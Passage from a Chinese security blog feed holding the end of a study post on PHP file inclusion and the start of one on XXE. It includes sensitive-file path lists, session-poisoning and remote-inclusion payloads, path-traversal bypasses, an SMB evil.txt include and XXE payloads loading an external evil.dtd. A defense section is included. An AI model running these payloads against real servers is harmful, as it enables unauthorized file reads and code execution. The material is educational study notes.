存储Windows系统初次安装的密码</p><p>c:\ProgramFiles\mysql\my.ini // MySQL配置</p><p>c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码</p><p>c:\windows\php.ini // php 配置信息</p></blockquote><p>Linux/Unix系统</p><blockquote><p>/etc/passwd // 账户信息</p><p>/etc/shadow // 账户密码文件</p><p>/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件</p><p>/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置</p><p>/usr/local/app/php5/lib/php.ini // PHP相关配置</p><p>/etc/httpd/conf/httpd.conf // Apache配置文件</p><p>/etc/my.conf // mysql 配置文件</p></blockquote><h3 id="session文件包含漏洞"><a href="#session文件包含漏洞" class="headerlink" title="session文件包含漏洞"></a>session文件包含漏洞</h3><p>session会话是存储在多个页面中使用的信息的方式,session不是保存在用户计算机中的</p><p>会话变量通过使用PHP全局变量$_SESSION设置,当php程序结束时,程序读取session的值,将其反序列化,发送到服务器中进行保存,然后保存管理器将会话保存在session.save_path中</p><p>利用条件: </p><ul><li>session存储位置可以获取</li></ul><p>常见的存放位置</p><blockquote><p>/var/lib/php/sess_PHPSESSID<br>/var/lib/php/sess_PHPSESSID<br>/tmp/sess_PHPSESSID<br>/tmp/sessions/sess_PHPSESSID<br>/tmp/tmp</p></blockquote><ul><li>session中的内容可以被控制,传入恶意代码</li></ul><p>1)可以通过phpinfo的信息来获取session的存储位置</p><p>搜索<code>session.save_path</code>来获取</p><p>2)猜测默认session存放位置进行尝试</p><p>linux下默认存储在/var/lib/php/session目录</p><p>代码示例:  </p><pre class=" language-PHP"><code class="language-PHP"><?php    session_start();$ctfs=$_GET['ctfs'];$_SESSION["username"]=$ctfs;?></code></pre><p>漏洞分析: </p><p>脚本获取到GET行变量的值存入session中</p><p>当访问 <a href="http://www.x.com/session.php?ctfs=wtf" target="_blank" rel="noopener">http://www.x.com/session.php?ctfs=wtf</a> </p><p>会在/var/lib/php/session目录下存储session 的值</p><p>session的文件名为  sess_+sessionid ,  sessionid可以通过开发者模式获取</p><p>漏洞利用: </p><p>通过ctfs传入的值会存储到session文件中,在存在本地文件包含漏洞的情况下,可以在ctfs写入恶意代码到session文件中,然后通过文件包含漏洞执行恶意代码来getshell</p><p>比如<code>?ctfs=&lt;?php phpinfo();?&gt;</code>得到session存储的位置</p><p><img src="https://i.loli.net/2020/01/13/bi9kNmCaT8X4ZyW.png" alt></p><p>构造payload</p><p><img src="https://i.loli.net/2020/01/13/ZUXkgHf2zqCS7y4.png" alt></p><p>其中../是目录切换符,后面会讲</p><h2 id="远程文件包含-RFI"><a href="#远程文件包含-RFI" class="headerlink" title="远程文件包含(RFI)"></a>远程文件包含(RFI)</h2><p>远程文件包含,就是包含远程服务器上的文件.</p><p>条件: </p><ul><li>allow_url_include=on(PHP版本5.2后,默认off)</li><li>allow_url_fopen=on(要上面那个打开有作用,这个必须也打开)</li></ul><p>最简单的代码示例: </p><pre class=" language-PHP"><code class="language-PHP"><?php    $filename  = $_GET['filename'];    include($filename);?></code></pre><p>payload: </p><pre><code>http://www.a.com/RFI.php?filename=http://www.b.com/RFI/php.txt</code></pre><p>在php.txt中写入<code>&lt;?php phpinfo();?&gt;</code></p><p>成功包含就能访问到有phpinfo界面</p><p>当然还能做的更多,主要依据防御的如何.</p><h1 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03  漏洞利用"></a>0x03  漏洞利用</h1><p>利用点: </p><blockquote><p>index.php?file= (action=) (page=)(path=)</p></blockquote><p>文件包含漏洞的利用,最常见的就是<strong>读</strong>源码(做CTF题时),或者通过文件包含漏洞和其他漏洞(文件上传)一起getshell(<strong>写</strong>),其实上面也总结的差不多了….</p><p>后面会从书中看看有没有更好的利用方式</p><h1 id="0x04-绕过姿势"><a href="#0x04-绕过姿势" class="headerlink" title="0x04  绕过姿势"></a>0x04  绕过姿势</h1><p><strong>%00截断</strong></p><p>这是因为<strong>PHP内核是C语言实现的,0字节\x00将作为字符串结束符</strong></p><p>条件: </p><ol><li>magic_quotes_gpc=off</li><li>PHP版本&lt;5.3.4</li></ol><p>即在构造的payload最后加上%00,这种情况,一般是因为后端代码指定了包含的文件的扩展名,因此可以截断后面的内容来包含任意文件</p><p><strong>%00截断目录遍历</strong></p><p>条件: </p><ol><li>magic_quotes_gpc=off</li><li>unix文件系统(FreeBSD, OpenBSD,Solaris)</li></ol><p>/var/www/%00</p><p><strong>路径长度截断</strong></p><p>条件: </p><p>php版本小于5.2.8</p><p>使用./或.来进行截断</p><p>条件: </p><p>Windows .的长度大于256;linux .的长度大于4096</p><blockquote><p>Windows下目录最大长度为256字节，超出的部分会被丢弃；</p><p>Linux下目录最大长度为4096字节，超出的部分会被丢弃。</p></blockquote><p>/etc/passwd/././././././.[…]/./././././.</p><p>/boot.ini/………[…]…………</p><p><strong>URL二次编码</strong></p><p>如果后端对用户的输入进行URL解码后再包含的话（类似下面的代码），就有可能利用url二次编码来绕过前面的过滤</p><pre class=" language-PHP"><code class="language-PHP"><?phpinclude(urldecode($_GET['file']));?></code></pre><p>我们先看一下利用的payload：</p><pre><code>%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd</code></pre><p>payload先被浏览器进行一次url解码，%25对应%，此时payload变为：</p><pre><code>%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd</code></pre><p>之后又被php进行一次url解码，%2e对应.，%2f对应/，因此最后包含的就是../../../etc/passwd</p><p>但是我觉得这个点,不是很好利用啊</p><p><strong>使用通配符</strong></p><p>&lt;&lt;</p><p>没有base_dir的限制,可以读到本地文件</p><blockquote><p>这个问题是由Windows APi FindFirstFile函数引起的，这是FindFirstFile的一个特性，查看php原代码发现在win32readdir.c，正是调用了FindFirstFile来操作文件的。因此受影响的并不止include函数。</p></blockquote><p><strong>双写绕过</strong></p><p>如果后端代码使用了<code>str_replace()</code>将../替换为空或者其他时,可以尝试双写绕过</p><p>…/./…/./…/./etc/passwd,实际情况是怎么过滤的就怎么绕过</p><hr><p><strong>?号绕过</strong></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">".html"</span><span class="token punctuation">)</span><span class="token delimiter">?></span></code></pre><p>?html就绕过啦</p><p><strong>#号绕过</strong></p><p>因为URL编码问题,需要把#编码为%23</p><p><strong>空格绕过</strong></p><p>%20</p><hr><p><strong>bypass allow_url_include=off</strong></p><p>包含smb共享服务中的文件,但只能对Windows的服务器有用,并且国内很多运营商默认关闭445端口</p><p>利用方式: </p><p>在smb共享文件夹放一个含有恶意代码的.txt文件,后缀名其实都无所谓,因为其中的内容都会被当做php代码来解析</p><p>然后包含这个smb服务的文件</p><pre><code>?file=\\ip\user\evil.txt</code></pre><h1 id="0x05-漏洞防御"><a href="#0x05-漏洞防御" class="headerlink" title="0x05  漏洞防御"></a>0x05  漏洞防御</h1><p>如果业务不需要一些文件包含的话</p><p>可以选择性的设置</p><p>allow_url_fopen=off allow_url-include=off</p><p>magic_quotes_gpc=on</p><p>过滤掉../../等 url中拼接到的http:// https://(RFI)</p><p>禁用0字节,因为用户完全不需要使用0字节</p><pre class=" language-php"><code class="language-php"><span class="token variable">$value</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"\0"</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>为PHP配置<code>open_basedir</code>可以时目录遍历(../../../)这种攻击方式无效</p><p>open_basedir的作用是限制在某个特定目录下PHP能打开的文件,与safe_mode是否开启无关</p><p>避免包含动态的变量,尤其是用户可以控制的变量,使用枚举的方法</p><pre class=" language-PHP"><code class="language-PHP"><?php    $file = $_GET['file'];//Whitelisting possible valuesswitch ($file) {    case 'main':    case 'foo':    case 'bar':        include '/home/www/include'.$file.'.php';        break;    default:        include '/home/www/include/main.php';}</code></pre><h1 id="0x06-漏洞挖掘"><a href="#0x06-漏洞挖掘" class="headerlink" title="0x06  漏洞挖掘"></a>0x06  漏洞挖掘</h1><p>这个漏洞的话,通过做CTF题也知道.一般就是<strong>观察url</strong>是否存在?file=  或者?page= 这种类型的 ,就可能存在文件包含漏洞,然后利用上面的payload去试,如果有错误回显就根据错误回显来判断</p><p>有时候也可以扫目录,或者robots.txt 看有没能够得到现成的phpinfo界面,然后看allow_url_fopen和allow_url_include的状态是什么样的,来对应的来进行利用,但是也要找到可以利用的参数才行</p><h1 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07  总结"></a>0x07  总结</h1><p>文件包含这个漏洞,单独利用现在已经很难了,一般都需要配合其他漏洞一起来利用,或者读到一些信息</p><h1 id="0x08-参考资料"><a href="#0x08-参考资料" class="headerlink" title="0x08  参考资料"></a>0x08  参考资料</h1><p><a href="https://www.freebuf.com/articles/web/182280.html" target="_blank" rel="noopener">Web安全实战系列：文件包含漏洞</a></p><p><a href="https://loong716.top/2019/11/03/File_Inclusion.html#%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0" target="_blank" rel="noopener">longlong师傅的File Inclusion Summary</a>  </p><p><strong><em>从这篇文章我学习了,学某个漏洞一定要求看相关的官方文档</em></strong></p><p><a href="https://www.nnullull.cn/index.php/archives/3/" target="_blank" rel="noopener">zjh师傅的TOP10-漏洞之文件包含</a></p><p><a href="https://www.cnblogs.com/dubhe-/p/9997842.html" target="_blank" rel="noopener">浅析PHP伪协议在CTF中的应用</a></p><p><a href="https://www.cnblogs.com/shellr00t/p/7638034.html" target="_blank" rel="noopener">PHP伪协议探究</a></p><p><a href="https://www.cnblogs.com/Renyi-Fan/p/9811197.html#_label0_2" target="_blank" rel="noopener">https://www.cnblogs.com/Renyi-Fan/p/9811197.html#_label0_2</a></p><p><a href="https://www.jianshu.com/p/3dc97deec491" target="_blank" rel="noopener">文件包含漏洞的几种利用</a></p><p><a href="https://3wapp.github.io/WebSecurity/php-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.html" target="_blank" rel="noopener">https://3wapp.github.io/WebSecurity/php-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.html</a></p><p><a href="http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html" target="_blank" rel="noopener">http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html</a></p><p>多查资料,多总结</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00  前言&quot;&gt;&lt;/a&gt;0x00  前言&lt;/h1&gt;&lt;p&gt;文件包含,就是用代码去包含(引用)其他文件(这个文件中有需要用到的代码),这样做的目的是节省开发者的时间,提高效率,与此同时也代带来了许多安全问题.以PHP为例,PHP的文件包含相关函数是无&lt;strong&gt;论参数的扩展名是什么,都会将内容当做PHP代码解析(PHP内核决定的)&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="TOP10基础漏洞" scheme="https://hack-for.fun/categories/TOP10%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="文件包含" scheme="https://hack-for.fun/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>一篇文章深入学习XXE漏洞</title>
    <link href="https://hack-for.fun/posts/20200110/"/>
    <id>https://hack-for.fun/posts/20200110/</id>
    <published>2020-01-10T10:31:05.460Z</published>
    <updated>2020-01-10T10:35:07.588Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00  前言"></a>0x00  前言</h1><p><em>把XXE归为TOP10基础漏洞,其实是因为我觉得是,并且难得分类了,以后所有的漏洞我都归类为TOP10基础漏洞</em></p><p>XXE的前身是XML注入,因为黑客想要得到的东西越来越多,所以出现了XXE</p><blockquote><p>实际上，XXE不是一个bug，而是XML解析器的well-documented特性。XML数据格式允许您在XML文档中包含任何外部文本文件的内容。</p></blockquote><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/xml%E6%B3%A8%E5%85%A5.png" alt></p><blockquote><p>本学习笔记,大量参考自网络上各位大佬总结好的,再加上自己的心得总结而成,用途仅用于安全技术学习.文末注明参考资料,侵删.</p></blockquote><a id="more"></a><h1 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01  基础知识"></a>0x01  基础知识</h1><h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><p>XML 指可扩展标记语言,XML 被设计用来传输和存储数据。</p><h3 id="什么是-XML"><a href="#什么是-XML" class="headerlink" title="什么是 XML?"></a>什么是 XML?</h3><ul><li>XML 指可扩展标记语言（<em>EX</em>tensible <em>M</em>arkup <em>L</em>anguage）</li><li>XML 是一种<em>标记语言</em>，很类似 HTML</li><li>XML 的设计宗旨是<em>传输数据</em>，而非显示数据</li><li>XML 标签没有被预定义。您需要<em>自行定义标签</em>。</li><li>XML 被设计为具有<em>自我描述性</em>。</li><li>XML 是 <em>W3C 的推荐标准</em></li></ul><h3 id="XML-树结构"><a href="#XML-树结构" class="headerlink" title="XML 树结构"></a>XML 树结构</h3><p><strong>XML 文档形成了一种树结构，它从“根部”开始，然后扩展到“枝叶”。</strong></p><p>来看一个XML实例</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="ISO-8859-1"?></span> <span class="token comment" spellcheck="true">&lt;!--XML声明 --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">></span></span> <span class="token comment" spellcheck="true">&lt;!--描述文档的根元素--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">></span></span>George<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--描述根的4个子元素to,from,heading,body --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">></span></span>John<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>heading</span><span class="token punctuation">></span></span>Reminder<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>heading</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>Don't forget the meeting!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--根元素的结尾--></span></code></pre><p>第一行是XML声明,定义了XML的版本和所使用的编码(可以不写这个)</p><blockquote><p>XML 文档必须包含<em>根元素</em>。该元素是所有其他元素的父元素。</p><p>XML 文档中的元素形成了一棵文档树。这棵树从根部开始，并扩展到树的最底端。</p><p>所有元素均可拥有子元素：</p><pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>child</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>subchild</span><span class="token punctuation">></span></span>.....<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>subchild</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>child</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre></blockquote><p>父、子以及同胞等术语用于描述元素之间的关系。</p><p>一张图来解释</p><p><img src="https://www.w3school.com.cn/i/ct_nodetree1.gif" alt></p><h3 id="XML语法"><a href="#XML语法" class="headerlink" title="XML语法"></a>XML语法</h3><p>所有的XML元素必须有关闭的标签,XML标签对大小写敏感</p><p>XML的属性值必须加引号(单双引号均可以),属性=”名称/值”</p><p>实体引用 ,因为在XML中一些字符拥有特殊的意义</p><p>如果把这些字符放在XML元素中,会发生错误,这是因为解析器会把他当做新元素的开始</p><p>在 XML 中，有 5 个预定义的实体引用：</p><table><thead><tr><th>&lt;</th><th>&lt;</th><th>小于</th></tr></thead><tbody><tr><td>&gt;</td><td>&gt;</td><td>大于</td></tr><tr><td>&amp;</td><td>&amp;</td><td>和号</td></tr><tr><td>&apos;</td><td>‘</td><td>单引号</td></tr><tr><td>&quot;</td><td>“</td><td>引号</td></tr></tbody></table><p>注释：在 XML 中，只有字符 “&lt;” 和 “&amp;” 确实是非法的。大于号是合法的，但是用实体引用来代替它是一个好习惯。</p><p>在XML中,<strong>空格会被保留</strong>,以LF存储换行</p><h3 id="XML解析器"><a href="#XML解析器" class="headerlink" title="XML解析器"></a>XML解析器</h3><p>所有线代浏览器都内建了读取和操作XML的XML解析器,解析器把XML转为为XML DOM对象  即可以通过javascript操作对象</p><p>loadXML()用于加载字符串,load()用于加载文件</p><h3 id="XML命名空间"><a href="#XML命名空间" class="headerlink" title="XML命名空间"></a>XML命名空间</h3><p>在两个不同的文档中使用相同的元素名时,就会发生命名冲突,可以使用前缀来避免命名冲突比如<code>&lt;h:table&gt;和&lt;f:table&gt;</code>就完美的区分了</p><p>使用命名空间,为标签添加属性xmlns,这样就为前缀赋予了一个与某个命名空间相关联的限定名称</p><h3 id="XML-CDATA"><a href="#XML-CDATA" class="headerlink" title="XML CDATA"></a>XML CDATA</h3><p>所有的XML文档中的文本均会被解析器解析,只有CDATA区段中的文本会被忽略</p><p>PCDATA:  指的是<strong>被解析</strong>的字符数据</p><p>CDATA 部分由 “*” 开始，由 “<em>]]&gt;</em>“ 结束：</p><pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token punctuation">[</span>CDATA<span class="token punctuation">[</span><span class="token keyword">function</span> <span class="token function">matchwo</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">&lt;</span> b <span class="token operator">&amp;&amp;</span> a <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> then  <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token keyword">else</span>  <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>创建元素</p><p>createElement() 方法创建新的元素节点。</p><p>createTextNode() 方法创建新的文本节点。</p><p>appendChild() 方法向节点添加子节点（在最后一个子节点之后）。</p><p>删除元素</p><p>removeChild() 方法删除指定的节点（或元素）。</p><h2 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h2><p>文档类型定义 (DTD) <a href="https://www.w3school.com.cn/dtd/index.asp" target="_blank" rel="noopener">https://www.w3school.com.cn/dtd/index.asp</a></p><p>DTD 的作用是定义 XML 文档的结构。只有在 Internet Explorer 中，可以根据 DTD 来验证 XML。</p><h3 id="DTD-外部文档声明"><a href="#DTD-外部文档声明" class="headerlink" title="DTD 外部文档声明"></a>DTD 外部文档声明</h3><p>假如 DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中：</p><pre><code>&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</code></pre><p>看一个例子</p><pre class=" language-XML"><code class="language-XML"><?xml version="1.0"?><!DOCTYPE note SYSTEM "note.dtd"> 这里读取note.dtd<note><to>George</to><from>John</from><heading>Reminder</heading><body>Don't forget the meeting!</body></note> </code></pre><h3 id="XML-文档构建模块"><a href="#XML-文档构建模块" class="headerlink" title="XML 文档构建模块"></a>XML 文档构建模块</h3><p>所有的 XML 文档（以及 HTML 文档）均由以下简单的构建模块构成：</p><ul><li>元素</li><li>属性</li><li>实体</li><li>PCDATA </li><li>CDATA</li></ul><h3 id="PCDATA"><a href="#PCDATA" class="headerlink" title="PCDATA"></a>PCDATA</h3><p>PCDATA 的意思是被解析的字符数据（parsed character data）。</p><p>可把字符数据想象为 XML 元素的开始标签与结束标签之间的文本。</p><p><strong>PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。</strong></p><p>文本中的标签会被当作标记来处理，而实体会被展开。</p><p>不过，被解析的字符数据不应当包含任何 &amp;、&lt; 或者 &gt; 字符；需要使用 &amp;、&lt; 以及 &gt; 实体来分别替换它们。</p><h3 id="CDATA"><a href="#CDATA" class="headerlink" title="CDATA"></a>CDATA</h3><p>CDATA 的意思是字符数据（character data）。</p><p><em>CDATA 是不会被解析器解析的文本。</em>在<strong>这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开</strong>。</p><h3 id="声明一个元素"><a href="#声明一个元素" class="headerlink" title="声明一个元素"></a>声明一个元素</h3><p>在 DTD 中，XML 元素通过元素声明来进行声明。元素声明使用下面的语法：</p><pre><code>&lt;!ELEMENT 元素名称 类别&gt;</code></pre><p>或者</p><pre><code>&lt;!ELEMENT 元素名称 (元素内容)&gt;</code></pre><h3 id="声明一个属性"><a href="#声明一个属性" class="headerlink" title="声明一个属性"></a>声明一个属性</h3><p>属性声明使用下列语法：</p><pre><code>&lt;!ATTLIST 元素名称 属性名称 属性类型 默认值&gt;</code></pre><h3 id="DTD-实体"><a href="#DTD-实体" class="headerlink" title="DTD  实体"></a>DTD  实体</h3><p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。</p><p>实体引用是对实体的引用。</p><p>实体可在内部或外部进行声明。</p><p>内部实体声明 </p><p>语法：</p><pre><code>&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</code></pre><p>外部实体声明 (XXE漏洞来源)</p><p>语法:  </p><pre><code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</code></pre><p>实体可以看成一个变量,我们可以在XML中使用&amp;符号进行引用</p><p><strong>示例代码：</strong></p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe &quot;test&quot; &gt;]&gt;</code></pre><p>这里 定义元素为 ANY 说明接受任何元素，但是定义了一个 xml 的实体（这是我们在这篇文章中第一次看到实体的真面目，实体其实可以看成一个变量，到时候我们可以在 XML 中通过 &amp; 符号进行引用），那么 XML 就可以写成这样</p><p><strong>示例代码：</strong></p><pre><code>&lt;creds&gt;&lt;user&gt;&amp;xxe;&lt;/user&gt;&lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt;</code></pre><p>我们使用 &amp;xxe 对 上面定义的 xxe 实体进行了引用，到时候输出的时候 &amp;xxe 就会被 “test” 替换。</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///c:/test.dtd&quot; &gt;]&gt;&lt;creds&gt;    &lt;user&gt;&amp;xxe;&lt;/user&gt;    &lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt;</code></pre><p>这样对引用资源所做的任何更改都会在文档中自动更新,非常方便</p><p>实体也分通用实体和参数实体 , 用&amp;实体名引用的实体叫做通用实体,在DTD中定义,在XML文档中引用</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span> <span class="token doctype">&lt;!DOCTYPE updateProfile [&lt;!ENTITY file SYSTEM "file:///c:/windows/win.ini"></span> ]> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>updateProfile</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>firstname</span><span class="token punctuation">></span></span>Joe<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>firstname</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>lastname</span><span class="token punctuation">></span></span><span class="token entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>lastname</span><span class="token punctuation">></span></span>      ... <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>updateProfile</span><span class="token punctuation">></span></span></code></pre><p>参数实体(参数实体在Blind XXE中非常重要): </p><p>1)使用% 实体名(中间有个空格),在DTD中定义,并且<strong>只能在DTD中使用%实体名;来进行引用</strong></p><p>2)只有在DTD文件中,参数实体的声明才能引用其他实体</p><p>3)和通用实体一样,参数实体也能够外部引用</p><pre><code>&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt; &lt;!ENTITY % remote-dtd SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt; %an-element; %remote-dtd;</code></pre><h1 id="0x02-什么是XXE"><a href="#0x02-什么是XXE" class="headerlink" title="0x02  什么是XXE"></a>0x02  什么是XXE</h1><p>XXE(XML External Entity Injection) 全称为 XML 外部实体注入，从名字就能看出来，这是一个注入漏洞，注入的是什么？XML外部实体。(看到这里肯定有人要说：你这不是在废话)，固然，其实我这里废话只是想强调我们的利用点是 <strong>外部实体</strong> ，也是提醒读者将注意力集中于外部实体中，而不要被 XML 中其他的一些名字相似的东西扰乱了思维(<strong>盯好外部实体就行了</strong>)，如果能注入 外部实体并且成功解析的话，这就会大大拓宽我们 XML 注入的攻击面（这可能就是为什么单独说 而没有说 XML 注入的原因吧，或许普通的 XML 注入真的太鸡肋了，现实中几乎用不到</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190206172102-8598dd2c-29f0-1.png" alt></p><p><strong>XXE漏洞原理</strong></p><p>既然XML可以从外部读取DTD文件，那我们就自然地想到了如果将路径换成另一个文件的路径，那么<strong>服务器在解析这个XML的时候就会把那个文件的内容赋值给SYSTEM前面的根元素中，只要我们在XML中让前面的根元素的内容显示出来，不就可以读取那个文件的内容了</strong>。这就造成了一个任意文件读取的漏洞。</p><p>那如果我们指向的是一个内网主机的端口呢？是否会给出错误信息，我们是不是可以从错误信息上来判断内网主机这个端口是否开放，这就造成了一个内部端口被探测的问题。</p><p>另外，一般来说，服务器解析XML有两种方式，一种是一次性将整个XML加载进内存中，进行解析；另一种是一部分一部分的、“流式”地加载、解析。如果我们递归地调用XML定义，一次性调用巨量的定义，那么服务器的内存就会被消耗完，造成了拒绝服务攻击。</p><p>XXE在CTF中的例题可以看着个 <a href="http://d0g1.top/2020/01/03/Jarvis%20OJ%20CTF%20Writeup/" target="_blank" rel="noopener">API调用</a></p><h1 id="0x03-XXE分类"><a href="#0x03-XXE分类" class="headerlink" title="0x03 XXE分类"></a>0x03 XXE分类</h1><h2 id="有回显读本地敏感文件-Normal-XXE"><a href="#有回显读本地敏感文件-Normal-XXE" class="headerlink" title="有回显读本地敏感文件(Normal XXE)"></a>有回显读本地敏感文件(Normal XXE)</h2><p>方法:  通过引用外部实体,引用服务器上的文件</p><p>一般情况下的payload: </p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;&lt;!DOCTYPE test [&lt;!ENTITY a SYSTEM &quot;file//c/:/windows/system,ini&quot;&gt; ]&gt;&lt;test&gt;&amp;a;&lt;/test&gt; 通过$a;引用通用实体a 来读取system.ini,当然这里的文件可以随便改</code></pre><p>但是如果文件中含有特殊字符,这种一般的payload是得不到什么东西的,并且会报错,这个时候就需要基础知识中的<strong>CDATA和参数实体</strong>了</p><p>(by 参考资料1)</p><p><strong>payload:</strong></p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE roottag [&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   &lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt;  &lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  &lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt; %dtd; ]&gt; &lt;roottag&gt;&amp;all;&lt;/roottag&gt;</code></pre><p><strong>evil.dtd</strong></p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</code></pre><p>这里将存在问题的  SYSTEM”file://…..”写在CDATA中,使其不被解析,而在evil.dtd中又通过参数实体来引用了goodies实体 进而读取文件</p><h2 id="无回显读取本地敏感文件-Blind-OOB-XXE"><a href="#无回显读取本地敏感文件-Blind-OOB-XXE" class="headerlink" title="无回显读取本地敏感文件(Blind OOB XXE)"></a>无回显读取本地敏感文件(Blind OOB XXE)</h2><p>正常情况下,服务器上的XML是不负责输出的,一般是用来配置服务的,那么想要利用这个漏洞就必须招待一个<strong>不依靠回显的方法</strong>,即:  